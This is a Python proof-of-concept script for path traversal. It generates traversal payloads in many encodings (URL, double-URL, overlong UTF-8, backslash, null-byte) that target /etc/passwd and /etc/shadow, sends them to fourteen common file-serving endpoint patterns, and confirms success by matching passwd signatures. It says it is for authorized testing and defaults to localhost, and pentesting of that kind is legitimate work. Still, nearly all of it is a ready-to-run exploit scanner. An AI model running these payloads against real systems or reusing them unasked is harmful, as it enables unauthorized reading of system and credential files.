#!/usr/bin/env python3
"""
PoC: Path Traversal (Directory Traversal) - CVE-GENERIC-PT-001

Vulnerability: Path traversal via unvalidated user input in URL path or query
parameters allows reading arbitrary files from the server filesystem.

This script attempts to read /etc/passwd using various directory traversal
sequences, including URL-encoded and double-encoded variants. It targets
common vulnerable endpoints that accept file path parameters.

Usage (authorized testing only):
    python poc_path_traversal_001.py --target http://localhost:8080 --timeout 10

Exit codes:
    0 - CONFIRMED: vulnerability reproduced
    1 - NOT_REPRODUCED: target does not appear vulnerable
    2 - ERROR: script encountered an error during execution

IMPORTANT: Only use against systems you have explicit written authorization
to test. Unauthorized access to computer systems is illegal.
"""

import argparse
import sys
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] PT-001: 'requests' library is required. Install with: pip install requests")
    sys.exit(2)

VULN_ID = "PT-001"

# Traversal sequences from shallow to deep
TRAVERSAL_DEPTHS = [
    "../" * depth for depth in range(1, 11)
]

# Target files to read (Linux)
TARGET_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hostname",
]

# Encoding variants for the traversal sequence
ENCODING_VARIANTS = {
    "plain": lambda s: s,
    "url_encoded": lambda s: s.replace("../", "%2e%2e%2f"),
    "double_url_encoded": lambda s: s.replace("../", "%252e%252e%252f"),
    "dot_encoded": lambda s: s.replace("../", "..%c0%af"),
    "backslash": lambda s: s.replace("../", "..\\"),
    "url_encoded_backslash": lambda s: s.replace("../", "..%5c"),
    "mixed_case_url": lambda s: s.replace("../", "%2E%2E/"),
    "null_byte_terminated": lambda s: s + "%00",
}

# Common vulnerable endpoint patterns
ENDPOINT_PATTERNS = [
    "/file?name={payload}",
    "/file?path={payload}",
    "/download?file={payload}",
    "/download?path={payload}",
    "/read?file={payload}",
    "/static/{payload}",
    "/assets/{payload}",
    "/include?page={payload}",
    "/view?doc={payload}",
    "/api/file?name={payload}",
    "/api/download?path={payload}",
    "/?file={payload}",
    "/?page={payload}",
    "/?path={payload}",
]

# Signatures that confirm successful file read
PASSWD_SIGNATURES = [
    "root:",
    "root:x:0:0:",
    "daemon:",
    "/bin/bash",
    "/bin/sh",
    "/sbin/nologin",
]


def check_response_for_traversal(response_text):
    """Check if the response contains evidence of successful path traversal."""
    matches = []
    for sig in PASSWD_SIGNATURES:
        if sig in response_text:
            matches.append(sig)
    return matches


def build_payloads():
    """Generate all traversal payload combinations."""
    payloads = []
    for depth_seq in TRAVERSAL_DEPTHS:
        for target_file in TARGET_FILES:
            raw_payload = depth_seq + target_file
            for variant_name, encoder in ENCODING_VARIANTS.items():
                encoded_payload = encoder(raw_payload)
                payloads.append({
                    "payload": encoded_payload,
                    "depth": depth_seq.count("../"),
                    "target_file": target_file,
                    "encoding": variant_name,
                })
    return payloads


def test_endpoint(target, endpoint_pattern, payload_info, timeout, session):
    """Test a single endpoint with a single payload. Returns matched signatures or empty list."""
    payload = payload_info["payload"]
    url = target.rstrip("/") + endpoint_pattern.format(payload=payload)

    try:
        response = session.get(url, timeout=timeout, allow_redirects=False)
        if response.status_code == 200:
            matches = check_response_for_traversal(response.text)
            if matches:
                return {
                    "url": url,
                    "status_code": response.status_code,
                    "matches": matches,
                    "depth": payload_info["depth"],
                    "encoding": payload_info["encoding"],
                    "target_file": payload_info["target_file"],
                    "response_length": len(response.text),
                }
    except RequestException:
        pass

    return None


def run_exploit(target, timeout):
    """
    Execute the path traversal PoC against the target.

    Returns:
        tuple: (exit_code, results_dict)
    """
    results = {
        "vuln_id": VULN_ID,
        "target": target,
        "status": "NOT_REPRODUCED",
        "confirmed_vectors": [],
        "partial_indicators": [],
        "total_requests": 0,
        "errors": [],
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "VulnAnalysis-PoC/1.0 (Authorized Security Testing)",
    })

    payloads = build_payloads()

    # First, verify target is reachable
    try:
        probe = session.get(target, timeout=timeout)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Target unreachable: {e}")
        return 2, results

    print(f"[*] {VULN_ID}: Testing {len(payloads)} payloads across {len(ENDPOINT_PATTERNS)} endpoints")

    confirmed = False
    for endpoint_pattern in ENDPOINT_PATTERNS:
        if confirmed:
            break
        for payload_info in payloads:
            results["total_requests"] += 1
            result = test_endpoint(target, endpoint_pattern, payload_info, timeout, session)

            if result is not None:
                results["confirmed_vectors"].append(result)
                if not confirmed:
                    print(
                        f"[+] {VULN_ID}: Traversal CONFIRMED via {result['encoding']} encoding "
                        f"at depth {result['depth']} on {endpoint_pattern}"
                    )
                    print(f"    URL: {result['url']}")
                    print(f"    Matched signatures: {', '.join(result['matches'])}")
                    confirmed = True
                    break

    if results["confirmed_vectors"]:
        results["status"] = "CONFIRMED"
        return 0, results

    # Check for partial indicators (e.g., different error messages for traversal vs normal)
    print(f"[*] {VULN_ID}: Checking for partial indicators...")
    try:
        baseline_resp = session.get(
            target.rstrip("/") + "/file?name=nonexistent.txt",
            timeout=timeout,
        )
        traversal_resp = session.get(
            target.rstrip("/") + "/file?name=../../../etc/passwd",
            timeout=timeout,
        )
        if (
            baseline_resp.status_code != traversal_resp.status_code
            or len(baseline_resp.text) != len(traversal_resp.text)
        ):
            results["partial_indicators"].append({
                "observation": "Different response for traversal vs baseline",
                "baseline_status": baseline_resp.status_code,
                "traversal_status": traversal_resp.status_code,
                "baseline_length": len(baseline_resp.text),
                "traversal_length": len(traversal_resp.text),
            })
    except RequestException:
        pass

    if results["partial_indicators"]:
        results["status"] = "PARTIAL"
        print(f"[~] {VULN_ID}: Partial indicators found - manual investigation recommended")
        return 1, results

    print(f"[-] {VULN_ID}: No path traversal indicators found after {results['total_requests']} requests")
    return 1, results


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Path Traversal vulnerability ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    print(f"[*] {VULN_ID}: Path Traversal PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Timeout: {args.timeout}s")
    print(f"[*] {'=' * 60}")

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    print(f"[*] {'=' * 60}")
    status = results["status"]
    if status == "CONFIRMED":
        print(f"[CONFIRMED] {VULN_ID}: Path traversal vulnerability confirmed")
        print(f"    Vulnerable vectors found: {len(results['confirmed_vectors'])}")
    elif status == "PARTIAL":
        print(f"[PARTIAL] {VULN_ID}: Partial indicators found, manual review needed")
    elif status == "ERROR":
        print(f"[ERROR] {VULN_ID}: {'; '.join(results['errors'])}")
    else:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Path traversal not reproduced")

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
